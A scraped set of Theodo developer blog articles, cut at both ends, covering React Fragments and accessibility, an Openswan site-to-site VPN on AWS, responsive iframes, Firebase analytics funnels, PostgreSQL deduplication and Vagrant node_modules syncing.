);\r\n}\r\n\nIt is even possible to write shorter Fragments tags like this (not supported by all tools)\n\r\nrender() {\r\n  return (\r\n    <>\r\n      <li />\r\n      <li />\r\n      <li />\r\n    </>\r\n  );\r\n}\r\n\n\u00a0\nConclusion\nAs you can see there are many reason for writing good HTML and it is also very important for one (often forgotten) reason : accessibility.\nAccessibility refers to the possibility for people with disabilities to read, understand, navigate and interact with your website. And\u00a0many features around accessibility (tab navigation, ARIA) are actually based on HTML features. If all your React components are enclosed in useless HTML tags, you\u2019ll turn tab navigation into hell for your disabled users.\nA good start the tackle these issues is to install linters like eslint which provide plugins for accessibility: eslint-plugin-jsx-a11y. React is a very powerful tool, but don\u2019t forget the basics!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tElie Dutheil\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tSome third-parties only allow you to call their APIs if you are inside their network. This can make life difficult if your application is hosted on AWS.\nThe solution is to create a site-to-site VPN connection between your AWS Virtual Private Cloud (VPC) and the third-party\u2019s corporate network.\nThere are two common ways to do that:\n\nThe AWS way, using AWS Managed VPNs\nThe DIY way, using a software VPN\n\nI will touch on AWS Managed VPNs and then go through the steps of manually setting up a software VPN.\nA Quick Word on AWS Managed VPNs\nAWS has a Managed VPN service in which you create a Virtual Private Gateway in your AWS VPC, set up a Customer Gateway (representing the third-party) and create a VPN connection between the two.\n\nThis is by far the easiest and most robust solution.\nHowever, it has one major limitiations that might make it unsuitable for your needs:\nWith AWS Managed VPNs, the VPN tunnel can only be initiated from the Customer Gateway, i.e. the third-party\u2019s side!\nAs a result of this, there are only two situations in which you can use the AWS Managed VPN service:\n\nRequests are initiated from the third-party to your AWS hosts and your hosts only serve the response\nRequests are initiated from your AWS host to the third-party, but the third-party takes responsibility for keeping the VPN tunnel up.\n\nThey can do this by creating a \u201ckeep-alive\u201d ping that is constantly sending traffic through the tunnel and blocks it from going down.\nHowever, if anything were to interrupt the ping, your app will get cut off from their API and you will have to rely on the third-party to bring the connection back up. Therefore. this is not really a viable solution for production-grade.\n\n\n\nIf requests are initiated from your AWS servers to the third-party, and the third-party is unable or unwilling to take responsibility for keeping the tunnel open, then AWS-managed VPNs will not work and you will need to use an alternative solution.\nHow to set up a software VPN on AWS using Openswan\nThe rest of this article will walk you through setting up a site-to-site VPN connection using the Openswan software VPN.\nAt a high level, there are three steps:\n\nCreate an EC2 instance in AWS that will run the OpenSwan VPN\nInstall and set up OpenSwan on that EC2 instance\nDebug if it doesn\u2019t work on first try \ud83d\ude09\n\n\nPart 1) Create an AWS EC2 instance to run Openswan\n\nOpen up your AWS console, go to the EC2 services and create a new instance:\n\nUse the Amazon Linux AMI.\nMake sure you create the instance in the same VPC as your web servers (assumed to be 172.31.0.0/16 in the diagram).\nMake sure you create it inside a public subnet (172.31.1.0/24 in the diagram).\nThis will give it a direct route out to the internet through the VPC\u2019s Internet Gateway.\nAdd a Name tag (e.g. \u201cOpenswan VPN\u201d) and create a security group (e.g. \u201cOpenswan SG\u201d)\n\nThis is going to be our VPN instance which will be responsible for establishing the VPN tunnel to the third-party.\nIn the EC2 dashboard, select your new VPN instance and choose: \u201cActions -> Network -> Change Source/Dest Checking\u201d and make sure the status is \u201cDisabled\u201d.\u00a0If it isn\u2019t, click on \u201cYes, Disable\u201d.\n\nBy default, AWS blocks any request to and from an EC2 instance that don\u2019t have that instance as either the source or destination of the request.\u00a0We need to disable this since we will be routing requests through this instance that have the 3rd-party as destination.\n\n\nIn the details of the VPN instance, you can see its Private IP.\u00a0 Note this down.\nIn the diagram above we assume it\u2019s 172.31.1.15\nBy default, instances in public subnets are allocated a public IP by AWS.\nWe could use this public IP for our VPN instance but it is much safer to allocate an Elastic IP for your instance:\n\n\nOn the sidebar, select Elastic IPs and allocate an Elastic IP to the VPN instance.\n\n\n\nIn the diagram, we have denoted it as EIP\nWe need to adjust the security group of our instance to accept traffic from your application:\n\n\nAdd an inbound rule that accepts traffic from inside your VPC (172.31.0.0/16 in our case)\n\n\n\nThe type of traffic will depend on what type of API requests you want to make. For most cases, a rule for HTTP and another for HTTPS traffic should be enough. If you want to enable pinging, you should also allow TCP traffic.\nThere is no need to explicitly add corresponding outbound rules.\nFinally, we need to tell our VPC router to route all requests to the 3rd-party through our VPN instance:\n\n\nGo to the VPC service and select Route Tables in the side bar.\n\n\n\nEach subnet will be associated with a route table. For each route table that is associated with one of your public subnets, we need to add the following rule:\n\nDestination: IP range of third-party network (10.0.1.0/24 in the diagram)\nTarget: {select your Openswan VPN instance from the dropdown}\n\n\n\nPart 2) Install and Configure OpenSwan\nWe are done with the AWS console for now.\nThe next step is to log into the instance and set up Openswan itself.\n\nSSH into the VPN instance: ssh ec2-user@{EIP}\nInstall openswan: sudo yum install openswan.\nThis will create an IPSec configuration file.\nWe need to edit it: sudo vi /etc/ipsec.conf\nWe want to include configuration files in /etc/ipsec.d/.\nFor this, you need to uncomment the last line:\n\n # /etc/ipsec.conf - Openswan IPsec configuration file\r\n#\r\n# Manual: ipsec.conf.5\r\n#\r\n# Please place your own config files in /etc/ipsec.d/ ending in .conf\r\n\r\nversion 2.0 # conforms to second version of ipsec.conf specification\r\n\r\n# basic configuration\r\nconfig setup\r\n# Debug-logging controls: \"none\" for (almost) none, \"all\" for lots.\r\n# klipsdebug=none\r\n# plutodebug=\"control parsing\"\r\n# For Red Hat Enterprise Linux and Fedora, leave protostack=netkey\r\nprotostack=netkey\r\nnat_traversal=yes\r\nvirtual_private=\r\noe=off\r\n# Enable this if you see \"failed to find any available worker\"\r\n# nhelpers=0\r\n\r\n#You may put your configuration (.conf) file in the \"/etc/ipsec.d/\" and uncomment this.\r\ninclude /etc/ipsec.d/*.conf\r\n\n\nNext we create our VPN configuration in a new file: sudo vi /etc/ipsec.d/third-party-vpn.conf.\nThis part is the tricky bit.\nYou can start by pasting the following template and replacing the option values with the correct settings for your environment.\u201c`bash\nconn third-party # Name of the connection. You can call it what you like\ntype=tunnel\nauthby=secret\nauto=start # load connection and initiate it on startup\n# Network Info\nleft=%defaultroute\nleftid={EIP} # Elastic IP of the VPN instance\nleftsourceip=172.31.1.15 # Private IP of the VPN instance\nleftsubnet=172.31.1.0/24 # IP range of your public subnet. Use this if you have a single public subnet.\n# If you have multiple subnets, use \u201cleftsubnets = {172.31.1.0/24 172.31.3.0/24 [\u2026]}\u201d\nleftnexthop=%defaultroute\nright={3rd-party-PublicIP} # Public IP address of third-party\u2019s VPN endpoint\nrightid={3rd-party-PrivateIP} # Private IP address of third-party\u2019s VPN endpoint if you have it\nrightsubnet=10.0.1.0/24 # IP range of third-party network. Use \u201crightsubnets\u201d if multiple subnets\n# Security Info\r\nike=aes192-sha1;modp1536 # IKE Encryption Policy and Diffie-Hallman Group\r\nikelifetime=3600s # IKE Lifetime\r\nesp=aes192-sha1;modp1536 # ESP Encryption policy and Diffie-Hallman Group\r\nsalifetime=43200s # IPSec Lifetime\r\npfs=yes # Perfect Forward Secrecy\r\n\n\u201c`\n\nThe configuration here needs to match what the third-party has set up on their side of the VPN connection.\nIn particular, make sure that IP addresses are correct and that both sides use the same authentication settings.\nIf you are interested to see what other options exist, take a look at the ipsec manual.\n\n\nNote that we used the setting authby=secret.\nThis means that Openswan will use a \u201cPre-shared key\u201d (PSK) to authenticate the connection.\nA PSK is simply a secret that is shared between you and the other side.\nWe need to create a secrets file sudo vi /etc/ipsec.d/third-party-vpn.secrets and paste:\n{EIP} {3rd Party Private IP}: PSK \"MY_SECRET_PRE_SHARED_KEY\"\r\n\nreplacing {EIP}, {3rd Party Private IP} and MYSECRETPRESHAREDKEY with the correct values.\nWe can now start Openswan:\n\nsudo service ipsec start # Start the service. This will try to establish the tunnel\r\nsudo chkconfig ipsec on # Make sure OpenSwan starts on boot\r\n\n\nFinally, since we will be using this instance as a router, we need to enable IP forwarding: sudo vi /etc/sysctl.conf and change the ip_forward option from 0 to 1:\n\nnet.ipv4.ip_forward = 1\r\n\n\nRestart the network:\n\nsudo service network restart\r\n\nIf everything went well, you should now have a working connection.\nPart 3) Test the Connection\nWe will test the connection in this order:\n\nCheck that the VPN tunnel can be established\nTest that you can connect to the 3rd-party from the VPN instance\nTest that you can connect to the 3rd-party from your web servers\n\n\n1. Test the VPN tunnel\nYou can check the status of the VPN tunnel using\nsudo ipsec auto --status\r\n\nIf the tunnel is up, you should see a line beginning with the name of your connection (\"third-party\" in our case) that contains the following statement near the end of the output:\nIPsec SA established\nIf you don\u2019t see this, the output should tell you how far into process it got and at what point the tunnel failed to build.\nTo get a few more logs, you can also try\nsudo ipsec auto --replace third-party\r\nsudo ipsec auto --up third-party\r\n\nMake sure the security protocols and the PSK match what the 3rd party has.\n\nThe logs should tell you which of them don\u2019t match\n\nIf the tunnel does not even begin the build process, you might be blocking traffic to/from the third party for you public subnets.\n\nIn the AWS console, in VPC -> subnets, check the Network ACL tab of your public subnets and make sure there are no rules that are blocking the traffic.\nCheck that the Openswan EC2 instance has the correct security group.\nIn particular, check that it\u2019s not blocking traffic to the third-party.\nAsk the third-party if they can see any attempts at building a VPN tunnel in their logs.\n\n2. Test connectivity from the Openswan instance\nOnce the tunnel is established, you can start testing the connection between your VPN instance and the 3rd-party.\nIdeally, you should attempt to make an HTTP or HTTPS request directly to the third-party API (e.g. using the curl command).\nYou can also try to ping a host in the 3rd-party network (for this, you need to allow TCP traffic in the instance\u2019s security group).\nIf you get a response, congrats!\nIf not, try the following:\n\nDouble-check that your Network ACLs and Security Groups are not blocking your request.\nAsk the 3rd-party to check that their firewall is not blocking your request.\nIf they are not seeing your requests, ask them to check their NAT-T configuration (this has caused me problems before when trying to connect to Cisco ASA devices)\n\nNAT-T should be enabled on our side by default.\nTo check, look in /etc/ipsec.conf for the value of the nat_traversal option.\n\n\n\n3. Test the connection from your web servers\nOnce you have connectivity between your Openswan instance and the 3rd party, you can finally test the connection from your web servers.\nSSH into one of your web servers and try to make a request to the third-party API.\nIf you get a response, well done, you have come a long way!\nYou should verify that you can actually connect to the 3rd party from all of your web servers.\nIf you are running a massive fleet, at least check that the connection works from each subnet.\nFor those less fortunate of you, repeat the debug steps above.\nIn addition to that, you can also try the following:\n\nCheck that the routing is set up correctly:\n\nIn the AWS Console, check that the route table of your public subnets is set up correctly (see step 6 in part 1 above)\nTry \u201ctraceroute <ip of third-party API server>\u201c.\nYou should see that the first step in the route is the (private) IP of the OpenSwan instance.\n\n\nIt is always worth checking that your security groups are not blocking your traffic.\nIt could happen that only some but not all of your web servers are able to connect to the 3rd party.\nIn this case:\n\nCheck that the VPN is correctly configured to handle all of your public subnets.\nIn particular, you may need to use the \u201cleftsubnets\u201d instead of the \u201cleftsubnet\u201d option.\nCheck with the 3rd party that they have configured their side of the connection (both the VPN and the firewalls) for all of your public subnets.\n\n\n\nNext Steps\nHopefully you should have a working VPN connection now.\nHowever, our VPN configuration still has a lot of room for improvement.\nThe most urgent concern is that we have not set up any monitoring or automatic fall-backs for the VPN tunnel.\nTo do so, you would need to create and configure a second VPN instance.\nNext, you could then setup a monitoring script on a separate instance that checks the state of each VPN tunnel.\nIf tunnel A goes down, the script should immediately adjust your route tables to reroute traffic through tunnel B while also trying to fix the tunnel A.\nIf you want to go down that rabbit-hole, I suggest you start with Appendix A of the AWS VPC connectivity options whitepaper.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBrian Azizi\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tNowadays, more and more people use their phones to navigate the web. It is therefore even more important now for websites to be responsive. Most websites use YouTube videos, Google maps or other external website elements embedded in them. These functions are most commonly incorporated in a web page using the html iframe element and is one of the trickiest thing to make responsive.\nI have struggled for a long time to get my YouTube videos to keep their ratio on different screen sizes. When testing my website on a smartphone, I would spend hours trying to figure out why my videos did not do what I expected\u2026 Until I finally discovered a great CSS trick that I can apply to all my iframes. Play with the size of the screen to see the responsive iframe at work. I can\u2019t wait to share this trick with you in the following article.\nResponsive Iframes\nFor the purpose of demonstration, this article will use a YouTube embed for our iframe. First, go on YouTube, click on \u2018share\u2019 under the video and then \u2018embed\u2019. You should now have the following code to copy into your html.\n<iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/dQw4w9WgXcQ\" frameborder=\"0\" gesture=\"media\" allow=\"encrypted-media\" allowfullscreen></iframe>\r\n\nNext, we need to remove width=\u201d560\u2033 height=\u201d315\u2033 because these are here to set the size of the iframe. Since we are going to be setting the size ourselves, this is unnecessary for our purposes.\nUsing CSS\nAfterwards, we need to wrap the iframe in another html element like a <div>, this is very important as this element will be sizing your iframe. Then add a CSS class to your new wrapping element and one class to your iframe as seen below.\n<div class=\"resp-container\">\r\n    <iframe class=\"resp-iframe\" src=\"https://www.youtube.com/embed/dQw4w9WgXcQ\" gesture=\"media\"  allow=\"encrypted-media\" allowfullscreen></iframe>\r\n</div>\r\n\nDefine your wrapper class with the following style:\n.resp-container {\r\n    position: relative;\r\n    overflow: hidden;\r\n    padding-top: 56.25%;\r\n}\r\n\n\nposition: relative The position of both the wrapper and the iframe is very important here. We are setting it to a position: relative so that we can later position our iframe in relation to the wrapping element. This is because in CSS, position: absolute positions the element based on the closest non static parent element.\noverflow: hidden is there to hide any elements that might be placed outside of the container.\npadding-top: 56.25% This is where the magic is. In CSS, the padding-top property can receive a percentage, this is what keeps our iframe to the right ratio. By using percentage, it will calculate the padding to use based on the width of the element. In our example, we want to keep the ratio of 56.26% (height 9 \u00f7 width 16) because this is the default ratio for YouTube videos. However, other ratios can be used as well.\n\nDefine your iframe class as follows:\n.resp-iframe {\r\n    position: absolute;\r\n    top: 0;\r\n    left: 0;\r\n    width: 100%;\r\n    height: 100%;\r\n    border: 0;\r\n}\r\n\n\nposition: absolute; This will give the iframe a position relative to the wrapper and let it be positioned over the padding of the wrapper.\ntop: 0 and left: 0 are used to position the iframe at the center of the container.\nwidth: 100% and height: 100% make the iframe take all of the wrapper\u2019s space.\n\nDemo\nOnce you are done, you should get an iframe that is responsive. Here I have a <video> instead because of some blog restrictions. But it works exactly the same way. You can play around with your browser size and see how responsive your iframes would be!\n\nUsing CSS Frameworks\nMost projects will use some kind of CSS framework to help with keeping the styling uniform throughout the project, may it be Bootstrap or Material-UI. Some of these frameworks already have predefined classes that will do exactly the same as what is in the above trick but unfortunately not all. In each case you need to create a wrapping element and give it a certain class.\nUsing Bootstrap\nIn Bootstrap 3.2 and over, use the predefined class .embed-responsive and an aspect ratio class modifier like .embed-responsive-16by9. There are other ones listed below. Similarly to the trick above, this aspect ratio modifier will add the padding-top with different percentages depending on the given modifier class. Then give your iframe the .embed-responsive-item class. Here is an example:\n<div class=\"embed-responsive embed-responsive-16by9\">\r\n  <iframe class=\"embed-responsive-item\" src=\"https://www.youtube.com/embed/dQw4w9WgXcQ\" allowfullscreen></iframe>\r\n</div>\r\n\nThe different aspect ratios that can be used are:\n\n.embed-responsive-21by9\n.embed-responsive-16by9\n.embed-responsive-4by3\n.embed-responsive-1by1\n\nYou can of course create your own modifier class. For example:\n.embed-responsive-10by3 {\r\n   padding-top: 30%;\r\n}\r\n\nUsing Materialize\nIf you are using Materialize CSS, then you don\u2019t need your own classes either. Just add the video-container class to your wrapper:\n<div class=\"video-container\">\r\n  <iframe src=\"//www.youtube.com/embed/Q8TXgCzxEnw?rel=0\" frameborder=\"0\" allowfullscreen></iframe>\r\n</div>\r\n\nUsing Foundation\n<div class=\"responsive-embed\">\r\n  <iframe src=\"https://www.youtube.com/embed/mM5_T-F1Yn4\" frameborder=\"0\" allowfullscreen></iframe>\r\n</div>\r\n\nAspect ratio modifier classes are set in your $responsive-embed-ratios map in your Foundation settings file:\n$responsive-embed-ratios: (\r\n  default: 16 by 9,\r\n  vertical: 9 by 16,\r\n  panorama: 256 by 81,\r\n  square: 1 by 1,\r\n);\r\n\nResponsive Images\nImages are a lot easier to deal with. With only a little CSS, you can have images keep their original aspect ratio whatever the size of the screen.\nUsing width\nIf you do not set the width to a fixed amount, but instead you fix it to 100% with a height: auto as so:\nimg {\r\n    width: 100%;\r\n    height: auto;\r\n}\r\n\nThen your images will be responsive and keep their ratio. However, using width means your images can scale to larger than their original size though and you could end up with a blurry image.\nUsing max-width\nIf you don\u2019t want your images to be larger than the original size, then use max-width: 100% instead:\nimg {\r\n    max-width: 100%;\r\n    height: auto;\r\n}\r\n\nIn the end, you will get responsive images, just like this one:\n\nSumming it all up\nIn conclusion, in this article we have seen the CSS trick that can make your iframes responsive. We have also seen multiple popular frameworks that provide predefined classes that will do it for you. As you saw, it\u2019s actually pretty easy and I hope I saved you hours of trying to fit your iframes on your mobile. Lastly, you saw how easy it is to fit your images in your responsive website.\nLet me know below in the comments what you think of the article and if you have any questions about anything above.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tGregory Gan\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tGoogle Analytics\u00a0funnels are a standard way to monitor conversion on a typical purchase flow (e.g. buying a book on an ecommerce site, subscribing to an online service or taking out an insurance policy).\u00a0Google have moved to have Firebase as their standard mobile app analytics platform, and there is good support to get up and running in react-native with this (see react-native-firebase).\nMarketing departments are more used to working with traditional GA, and Google have therefore made it easy to\u00a0link a Firebase app to a GA app. You would think this would mean your marketing department can jump on an make a funnel in no time, but the funnel is based on events and although the default screen view is an event, the name of the screen is a parameter that can\u2019t be accessed when building the funnel (as of this point in writing).\nAssuming you\u2019ve set up firebase in your react-native project, the default screen view event to use would be something like:\nfirebase.analytics().setCurrentScreen(action.routeName);\nThis though would go through as a screen_view event and you would not be able to build a funnel:\n\nThere are two options to resolve this:\n\nMake an event per page, rather than just using the screen_view event and then you can build your funnel.\n Link to BigQuery and build your own funnel using the raw data\n\n\u00a0\nOption 1 will be the least strain on your marketing department, but means that past data you\u2019ve recorded in your app can\u2019t be used. As the marketing department is the primary user of analytics, option 1 is my suggestion and you can do adhoc work in BigQuery if you need past analysis. \nTo trigger an event per page using the same library as before the syntax is much the same: \nfirebase.analytics().logEvent(`Page_${action.routeName}`, {});\nPut this in the same point in your code as the original command (and keep the original one in case GA\u2019s tooling improves).\nTo get all the custom events available to build your funnel you need to go through the app manually triggering the events at least once, which is a pain, but your users could do this naturally for you if you can wait. (Note: although you see the events in the live view it can take a while for them to propagate up to the event options.)\nNow your marketing team can build funnels to their hearts content, and if your event logic is in your default navigator new pages will automatically appear as events ready for them to add to their funnel. \nHopefully GA\u2019s support for funnels will include parameter filters in the future, but until then this is a low cost workaround.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBen Ellerby\r\n  \t\t\t\r\n  \t\t\t\tI'm an Architect Developer, working with startups to launch MVP's and large corporates to deliver in startup speed. \r\n\r\nI'm tech at heart, loving to code, participating in hackathons, guest lecturing as part of the University of Southampton CompSci course and acting as a tech advisor to multiple startups.\r\n\r\nhttps://www.linkedin.com/in/benjaminellerby/  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\n\nI was working on a project where we needed to aggregate information on employees from 10 different tables and make the resulting table clear (no duplicate rows), containing full information on people working in the big company.\nWhile making this I understood that the emergence of duplicates (or duplicate rows) is inevitable when you work with a large amount of data aggregating several tables into one. Fortunately PostgreSQL has some features that are extremely useful while working with detection and elimination of duplicates.\nI want to put your attention on these features and help you to never have problems with duplicates.\nDuplicate or Duplicate row is a row in a table looking exactly or almost exactly like some another row (original row) in this table.\nSo we can deal with absolutely identical rows and almost identical rows. For example theirs ids can differ but all other properties are exactly the same.\nSo, what can you do with the duplicates?\nFor absolutely identical rows:\n\nFind them\nDelete them\n\nFor almost identical rows (identical except for one or more properties):\n\nCombine information from duplicate rows into one row\nSelect one of the rows according to some criteria and delete the remaining ones.\n\nThat is what my article is about.\n1) How to find duplicates?\nImagine you have a table containing some data on employees of a company. For example, in this table we are dealing with personal data about employees including their first name, last name, position, department and date of the beginning of a contract in these department on these position.\n+----+-----------+-----------+------------+---------------+-------------+\r\n| id | firstname | lastname  | startdate  | position      | department  |\r\n+----+-----------+-----------+------------+---------------+-------------+\r\n| 1  | Olivier   | Le Blanc  | 2010-03-01 | PDG           | RTM         |\r\n| 2  | Maria     | Green     | 2016-06-01 | Intern        | STP/RMP     |\r\n| 3  | Maria     | Green     | 2016-11-01 | RH            | STP/RMP     |\r\n| 5  | Maria     | Green     | 2017-07-07 | DRH           | STP/RMP     |\r\n| 4  | Paul      | Jones     | 2017-01-01 | Developer     | RTM/FMP     |\r\n| 6  | Paul      | Jones     | 2017-06-01 | Project Chief | RTM/BSO     |\r\n+----+-----------+-----------+------------+---------------+-------------+\r\n\r\n\nIn order to find duplicates we face two problems:\n\nCount the number of rows in each group.\nFind duplicate rows and theirs ids\n\nHere is the fastest way to split rows into categories and to display those that have more than one row in it.\nSELECT\r\n  firstname,\r\n  lastname,\r\n  count(*)\r\nFROM people\r\nGROUP BY\r\n  firstname,\r\n  lastname\r\nHAVING count(*) > 1;\r\n\n+-----------+-----------+-------+\r\n| firstname | lastname  | count |\r\n+-----------+-----------+-------+\r\n| Maria     | Green     |   3   |\r\n| Paul      | Jones     |   2   |\r\n+-----------+-----------+-------+\r\n\n\nCount(*) counts the number of rows in each group.\nIn GROUP BY we can add the criterias (properties) by which we are looking for duplicates.\nThe result is a table (firstname, lastname, count) containing the properties according which the groups were defined and the number of rows per group.\n\nNow we want to display duplicate rows with all information.\nSELECT * FROM\r\n  (SELECT *, count(*)\r\n  OVER\r\n    (PARTITION BY\r\n      firstname,\r\n      lastname\r\n    ) AS count\r\n  FROM people) tableWithCount\r\n  WHERE tableWithCount.count > 1;\r\n\n+----+-----------+----------+--------------+---------------+------------+---------+\r\n| id | firstname | lastname |  startdate   | position      | department |  count  |\r\n+----+-----------+----------+--------------+---------------+------------+---------+\r\n| 2  | Maria     | Green    |  2016-06-01  | Intern        | STP/RMP    |    3    |\r\n| 3  | Maria     | Green    |  2016-11-01  | RH            | STP/RMP    |    3    |\r\n| 5  | Maria     | Green    |  2017-07-07  | DRH           | STP/RMP    |    3    |\r\n| 4  | Paul      | Jones    |  2017-01-01  | Developer     | RTM/FMP    |    2    |\r\n| 6  | Paul      | Jones    |  2017-06-01  | Project Chief | RTM/BSO    |    2    |\r\n+----+-----------+----------+--------------+---------------+------------+---------+\r\n\n\nPARTITION BY divides into groups and disposes all rows that are presented one after another.\nUsing PARTITION BY and \u2018count > 1\u2019 we can extract rows having duplicates.\nThe result is a table with columns (id, firstname, lastname, startdate, position, department, count) where we see all the duplicate rows including the original row.\n\nBy the way, through the PARTITION BY it is possible to simplify a whole class of tasks of analytics and billing. Instead of count(*) we can use any function like MEAN, MAX, MIN, SUM\u2026 and calculate a value per group. Mean salary is a good example.\n2) How to delete duplicates?\nThe next question that inevitably arises: how to get rid of duplicates?\nHere is the most efficient and fastest way to select data without unnecessary duplicates:\nFor absolutely identical rows:\nSELECT DISTINCT * FROM people;\r\n\r\nFor almost identical rows:\r\n\r\nSELECT DISTINCT ON (firstname, lastname) * FROM people\nIn the case of almost identical rows we need to list all properties on the basis of which we are looking for duplicates.\nThus, if we want to remove duplicated data from a table, we can use the following method :\nDELETE FROM people WHERE people.id NOT IN \r\n(SELECT id FROM (\r\n    SELECT DISTINCT ON (firstname, lastname) *\r\n  FROM people));\r\n\nFor those who have read this article up to this point, here is a very cool tip of PostgreSQL to keep your code clean and readable.\nWITH unique AS\r\n    (SELECT DISTINCT ON (firstname, lastname) * FROM people)\r\nDELETE FROM people WHERE people.id NOT IN (SELECT id FROM unique);\r\n\nA very useful thing for complex queries where without named subqueries you can break your entire brain, conjuring with joins and brackets of subqueries. This incredibly useful feature is called Common Table Expression. By the way, there is a possibility to use multiple subqueries and one subquery can be based on another subquery. You can learn more here.\nWITH some_name AS\r\n (SELECT DISTINCT ON (firstname, lastname) * FROM people),\r\nsome_another_name AS (SELECT id, position, department FROM some_name)\r\nSELECT * FROM some_another_name WHERE ... ;\r\n\n3) How to combine duplicate rows in one single row\nNow we come to something more interesting. We want to make sure that each category has only one row but we don't want to lose any information. The best way to do this is to remove duplicates while merging their records into one row. For example, we want to have only one row per person, but for which both position values and department values are written into one cell in the following way 'value 1 / value 2 / ...'. This is easily accomplished by using the function of concatenation 'string_agg'.\nSELECT\r\n  firstname,\r\n  lastname,\r\n  string_agg(position, ' / ') AS positions,\r\n  string_agg(department, ' / ') AS departments\r\nFROM people\r\nGROUP BY\r\n  firstname,\r\n  lastname;\r\n\r\n\n+-----------+----------+---------------------------+-----------------------------+\r\n| firstname | lastname | positions                 | departments                 |\r\n+-----------+----------+---------------------------+-----------------------------+\r\n| Maria     | Green    | Intern / RH / DRH         | STP/RMP / STP/RMP / STP/RMP |\r\n| Olivier   | Le Blanc | PDG                       | RTM                         |\r\n| Paul      | Jones    | Developer / Project chief | RTM/FMP / RTM/BSO           |\r\n+-----------+----------+---------------------------+-----------------------------+\n\nGROUP BY separates data on categories.\nstring_agg() aggregates information from duplicate rows\nNo matter how many duplicates we have, in the end we\u2019ll have just three rows with combined information.\n\n4) How to delete unwanted duplicates and save exactly what you want\nNow let\u2019s imagine that for every employee there are two properties indicating the start date and the end date of a contract.\nIf some person changed several positions in the company, there are few corresponding lines in the table. For each employee we need to find a row corresponding to the last contract, not taking into account the previous contracts. That is, in fact, find a contract with the latest start date.\nYou can do this as follows:\nSELECT id, firstname, lastname, startdate, position FROM\r\n  (SELECT id, firstname, lastname, startdate, position,\r\n     ROW_NUMBER() OVER \r\n(PARTITION BY (firstname, lastname) ORDER BY startdate DESC) rn\r\n   FROM people\r\n  ) tmp WHERE rn = 1;\n+----+------------+----------+--------------+---------------+\r\n| id | firstname  | lastname |  startdate   | position      |\r\n+----+------------+----------+--------------+---------------+\r\n| 5  | Maria      | Green    |  2017-07-07  | DRH           |\r\n| 1  | Olivier    | Le Blanc |  2010-03-01  | PDG           |\r\n| 6  | Paul       | Jones    |  2017-06-01  | Project Chief |\r\n+----+------------+----------+--------------+---------------+\n\nPARTITION BY divides into groups and ORDER BY sorts them by descending order.\nROW_NUMBER() assigns an integer number to every row in each category.\nTo have rows with the latest date we simply choose those with row number equals to 1.\nNotice that we need to have some name for a query in br\u0430\u0441kets. It's better to use a common table expression WITH ... AS \n\nConclusion\nAs you can see, working with duplicates is not so difficult. They are easy to be detected and to be removed if necessary.\n\n"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tVagrant offers the possibility to sync files between your host and your VM, a great way to edit your code on your favorite IDE while being able to run it in a VM.\nNot all files are worth syncing though \u2013 have you ever wished to specifically avoid syncing heavy folders to your host such as your node modules or your error logs?\nLet\u2019s see how doing this can lead to tripling the speed of your npm install.\nYou have different ways to sync your files with Vagrant. For performance you probably want to use NFS \u2013 only available if your host is macOS or Linux.\nDisabling the sync of node modules\n\nOn one of my projects, I was hit by a file sync issue between my host and my VM, due to the then recently released Apple APFS filesystem.\nTo mitigate this issue I needed to find a way to avoid my node modules to be synced from my VM to my host, and was helped by a trick found on Stack Overflow.\nThe idea here will be to replace in your VM your node_modules folder with a symbolic link pointing to a folder outside of the synced folder(s) \u2013 hence, content of node_modules won\u2019t be synced to your host.\nWhat your host will see will only be the symbolic link, which won\u2019t point to an actual folder on your host \u2013 this shouldn\u2019t cause any issue.\nLet\u2019s say you have already set up a Vagrant synced folder with NFS, for example thanks to the following line in your Vagrantfile:\nconfig.vm.synced_folder \".\", \"/your-project\", type: \"nfs\"\r\n\nIf you have already run npm install you first need to move the node_modules outside of your synced folder:\n\u26a0\ufe0f Note: all commands from now on are to be run in your VM\n$ cd /your-project\r\n$ mv node_modules /outside-of-synced-folder\r\n\nIf you haven\u2019t, you need to create the folder:\n$ mkdir /outside-of-synced-folder/node_modules\r\n\nOnce node_modules has been moved or created, you can create the symbolic link in your project directory:\n$ ln -s /outside-of-synced-folder/node_modules /your-project/node_modules\r\n\nThen you can run:\n$ npm install\r\n\nCase in point\nTrying this with 